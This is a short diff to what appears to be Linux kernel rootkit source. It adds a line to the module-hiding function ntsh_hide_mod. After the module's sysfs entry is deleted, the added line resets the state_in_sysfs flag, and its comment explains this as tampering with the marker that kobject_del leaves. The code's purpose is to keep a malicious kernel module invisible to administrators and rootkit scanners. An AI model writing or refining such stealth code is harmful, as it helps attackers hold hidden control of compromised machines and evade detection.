@@ -220,6 +220,12 @@ static void ntsh_hide_mod(void) {
     rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
     rmmod_ctrl.parent = lkmmod.this_mod->mkobj.kobj.parent;
     kobject_del(lkmmod.this_mod->holders_dir->parent);
+
+    /**
+     * Again mess with the known marker set by
+     * kobject_del()
+     */
+    lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
 }
 
 /*
